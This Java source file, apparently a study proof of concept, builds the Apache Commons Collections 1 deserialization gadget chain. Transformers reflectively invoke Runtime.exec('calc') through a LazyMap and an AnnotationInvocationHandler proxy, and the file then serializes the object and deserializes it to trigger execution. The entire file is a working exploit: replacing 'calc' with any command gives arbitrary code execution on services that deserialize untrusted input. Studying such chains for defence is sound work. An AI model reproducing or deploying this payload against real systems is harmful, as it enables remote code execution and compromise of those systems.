package com.mechoy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/24
 */
public class CC1Test2 {
    final static String path = "ser.bin";

    public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("zzz","kkk");

        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aih.getDeclaredConstructor(Class.class,Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler)declaredConstructor.newInstance(Target.class, lazyMap);

        Object invocationHandlerProxy = Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), new Class[]{Map.class}, invocationHandler);
        Object o = declaredConstructor.newInstance(Target.class, invocationHandlerProxy);
        serialize(o);
        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
